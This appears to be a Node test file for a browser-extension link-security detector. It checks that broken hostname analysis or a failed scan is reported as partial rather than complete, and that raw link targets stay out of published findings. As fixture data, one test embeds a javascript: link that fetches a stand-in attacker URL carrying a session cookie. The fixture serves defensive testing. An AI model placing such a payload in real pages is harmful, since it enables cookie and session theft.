// Shield for TASKS 7.14, 7.15 and 7.16 - the C5.6 rule "it broke must never look like it is clean".
// Three separate ways the module used to report a clean, complete scan while something was lost:
//   7.14 the page's own hostname failed to analyse and only a Logger.warn recorded it;
//   7.15 an explicit performScan() threw, so scanFailed stayed false and the rejection escaped into
//        the content script's multi-module loop;
//   7.16 the internal dedupeKey travelled out of the module inside recentFindings, carrying up to
//        96 characters of a raw javascript:/data: target off the page.
// Run: node modules/link-domain-security/errorVisibility.test.mjs

import assert from 'node:assert/strict';

class StubElement {}
globalThis.Element = StubElement;
globalThis.Node = class { static TEXT_NODE = 3; static ELEMENT_NODE = 1; };
globalThis.performance = { now: () => 0 };
globalThis.window = { location: new URL('https://shop.example.com/catalog') };

const LINK_TEXT_PRIVACY_SELECTOR = 'input, textarea, select, option, optgroup, [contenteditable]:not([contenteditable="false"]), [role="textbox" i]';

function makeElement(tagName, attributes = {}, text = '') {
    return Object.assign(Object.create(StubElement.prototype), {
        tagName: tagName.toUpperCase(),
        localName: tagName.toLowerCase(),
        attributes,
        children: [],
        childNodes: text ? [{ nodeType: 3, textContent: text }] : [],
        parentElement: null,
        isConnected: true,
        getAttribute: (name) => (Object.hasOwn(attributes, name) ? attributes[name] : null),
        hasAttribute: (name) => Object.hasOwn(attributes, name),
        matches(selector) {
            if (selector === 'a[href]') {
                return this.tagName === 'A' && Object.hasOwn(attributes, 'href');
            }
            if (selector === 'form[action]') {
                return this.tagName === 'FORM' && Object.hasOwn(attributes, 'action');
            }
            if (selector === LINK_TEXT_PRIVACY_SELECTOR) {
                return ['INPUT', 'TEXTAREA', 'SELECT', 'OPTION', 'OPTGROUP'].includes(this.tagName);
            }
            throw new Error(`unexpected selector in the stub: ${selector}`);
        }
    });
}

function appendChild(parent, child) {
    child.parentElement = parent;
    parent.children.push(child);
    parent.childNodes.push(child);
    return child;
}

const { default: LinkDomainSecurityDetector } = await import('./LinkDomainSecurityDetector.js');

function buildPage(hrefs) {
    const root = makeElement('html');
    const body = appendChild(root, makeElement('body'));
    for (const href of hrefs) {
        appendChild(body, makeElement('a', { href }, 'Open'));
    }
    globalThis.document = { documentElement: root, baseURI: globalThis.window.location.href };
    return root;
}

function buildDetector() {
    const detector = new LinkDomainSecurityDetector();
    detector.config = {
        detectHomographs: true,
        detectLinkMismatch: true,
        detectRedirectPatterns: true,
        detectUnsafeProtocols: true
    };
    detector.isEnabled = true;
    return detector;
}

// --- 7.14: a broken current-hostname analysis makes the scan partial ----------------------------
{
    buildPage(['https://partner.example.org/page']);
    const detector = buildDetector();
    // Only the current-hostname path is broken; the candidates still scan cleanly.
    const original = detector.analyzeHostname.bind(detector);
    detector.analyzeHostname = (hostname) => {
        if (hostname === 'shop.example.com') {
            throw new Error('hostname analysis exploded');
        }
        return original(hostname);
    };

    await detector.firstScan();
    const state = detector.getSnapshotState();

    assert.equal(state.partialResult, true, 'a lost current-hostname analysis must make the scan partial');
    assert.equal(state.status, 'partial', 'status must say partial, not complete');
    assert.equal(detector.unitErrorCount, 1, 'the lost unit of work must be counted');
    assert.equal(detector.lastErrorContext, 'current-hostname', 'the error context must name the unit');
}

// --- 7.14 control: a healthy page still reports complete ----------------------------------------
{
    buildPage(['https://partner.example.org/page']);
    const detector = buildDetector();
    await detector.firstScan();

    assert.equal(detector.getSnapshotState().status, 'complete', 'a healthy scan must still be complete');
    assert.equal(detector.unitErrorCount, 0, 'a healthy scan must not invent unit errors');
}

// --- 7.15: a failing performScan is a recorded level-2 event, not a rejection --------------------
{
    buildPage(['https://partner.example.org/page']);
    const detector = buildDetector();
    detector.collectCandidatesFromRoot = () => {
        throw new Error('traversal exploded');
    };

    const result = await detector.performScan();

    assert.equal(detector.scanFailed, true, 'a failed scan must be recorded as failed');
    assert.equal(result.partialResult, true, 'the returned snapshot must not claim full coverage');
    assert.equal(result.status, 'partial', 'the returned status must be partial');
    assert.equal(result.stats.scanFailed, true, 'stats must carry the failure too');
}

// --- 7.15 control: a healthy performScan returns a complete snapshot ----------------------------
{
    buildPage(['https://partner.example.org/page']);
    const detector = buildDetector();
    const result = await detector.performScan();

    assert.equal(detector.scanFailed, false, 'a healthy scan must not be marked failed');
    assert.equal(result.status, 'complete', 'a healthy performScan must report complete');
}

// --- 7.16: the internal dedupeKey does not leave the module -------------------------------------
{
    buildPage([
        'javascript:void(fetch("https://evil.example.net/steal?cookie=secret-session-value"))',
        'https://partner.example.org/login'
    ]);
    const detector = buildDetector();
    await detector.performScan();

    assert.ok(detector.recentFindings.length > 0, 'the page must produce findings at all');
    for (const finding of detector.recentFindings) {
        assert.equal(
            Object.hasOwn(finding, 'dedupeKey'),
            false,
            `a published finding must not carry dedupeKey: ${JSON.stringify(finding)}`
        );
    }
    // The point of the field never leaving: the raw target went with it.
    const serialized = JSON.stringify(detector.getStats());
    assert.ok(
        !serialized.includes('secret-session-value'),
        'the raw javascript: target must not reach the stats payload'
    );
    // Deduplication itself is untouched - the key still lives in the module.
    assert.ok(detector.seenFindingKeys.size > 0, 'the key set must still be populated');
}

console.log('errorVisibility.test.mjs: OK');
